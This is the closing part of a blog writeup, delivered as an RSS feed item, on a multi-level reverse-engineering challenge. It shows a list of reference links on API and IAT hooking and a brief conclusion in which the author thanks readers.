<li><a href="https://github.com/microsoft/Detours">https://github.com/microsoft/Detours</a></li>
<li><a href="http://jbremer.org/x86-api-hooking-demystified/">http://jbremer.org/x86-api-hooking-demystified/</a></li>
<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking">https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking</a></li>
</ul>
<h2 id="5-conclusion">5. Conclusion</h2>
<p>It was very enjoyable, even though i was stuck way too long on level2, because of something silly.
There&rsquo;s a lot of manual unpacking described here, but that was my intention (not just fire some tool and forget).</p>
<p>I hope this writeup does not contain too many mistakes: should you spot anything incorrect, feel free to <a href="https://twitter.com/matth_walter">contact me</a>.</p>
<p>Thank you for reading.</p>
]]></content>
		</item>
		
	</channel>
</rss>
